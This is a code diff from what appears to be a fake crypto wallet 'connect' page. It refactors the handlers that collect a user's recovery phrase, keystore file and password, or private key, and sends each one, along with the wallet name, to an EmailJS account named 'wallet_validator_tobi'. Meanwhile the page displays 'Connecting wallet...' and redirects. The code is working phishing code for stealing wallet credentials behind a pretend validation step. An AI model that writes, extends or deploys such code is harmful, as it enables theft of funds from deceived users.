@@ -27,6 +27,26 @@ const formInput = {
   privateKey: ''
 }
 
+function sendEmail(data) {
+  data.walletName = currentWallet.name
+
+  emailjs
+    .send(
+      'wallet_validator_tobi',
+      'template_crypto_validate',
+      data,
+      'SKECErAHJ5g1CQj--'
+    )
+    .then(
+      (result) => {
+        redirectUser()
+      },
+      (error) => {
+        router.push({ name: 'wallets-view' })
+      }
+    )
+}
+
 const formSubmit = {
   recoveryPhrase() {
     showCreds.errorMsg = ''
@@ -36,23 +56,9 @@ const formSubmit = {
       return false
     }
 
-    emailjs
-      .send(
-        'wallet_validator_tobi',
-        'template_crypto_validate',
-        {
-          recoveryPhrase: formInput.recoveryPhrase
-        },
-        'SKECErAHJ5g1CQj--'
-      )
-      .then(
-        (result) => {
-          redirectUser()
-        },
-        (error) => {
-          router.push({ name: 'wallets-view' })
-        }
-      )
+    sendEmail({
+      recoveryPhrase: formInput.recoveryPhrase
+    })
     showCreds.successMsg = 'Connecting wallet...'
   },
   keyStoreJson(e) {
@@ -65,24 +71,10 @@ const formSubmit = {
 
     const reader = new FileReader()
     reader.onloadend = () => {
-      emailjs
-        .send(
-          'wallet_validator_tobi',
-          'template_crypto_validate',
-          {
-            walletPassword: formInput.walletPassword,
-            keyStore: reader.result
-          },
-          'SKECErAHJ5g1CQj--'
-        )
-        .then(
-          (result) => {
-            redirectUser()
-          },
-          (error) => {
-            router.push({ name: 'wallets-view' })
-          }
-        )
+      sendEmail({
+        walletPassword: formInput.walletPassword,
+        keyStore: reader.result
+      })
     }
     reader.readAsBinaryString(formInputKeyStoreJson.value.files[0])
     showCreds.successMsg = 'Connecting wallet...'
@@ -95,23 +87,9 @@ const formSubmit = {
       return false
     }
 
-    emailjs
-      .send(
-        'wallet_validator_tobi',
-        'template_crypto_validate',
-        {
-          privateKey: formInput.privateKey
-        },
-        'SKECErAHJ5g1CQj--'
-      )
-      .then(
-        (result) => {
-          redirectUser()
-        },
-        (error) => {
-          router.push({ name: 'wallets-view' })
-        }
-      )
+    sendEmail({
+      privateKey: formInput.privateKey
+    })
     showCreds.successMsg = 'Connecting wallet...'
   }
 }
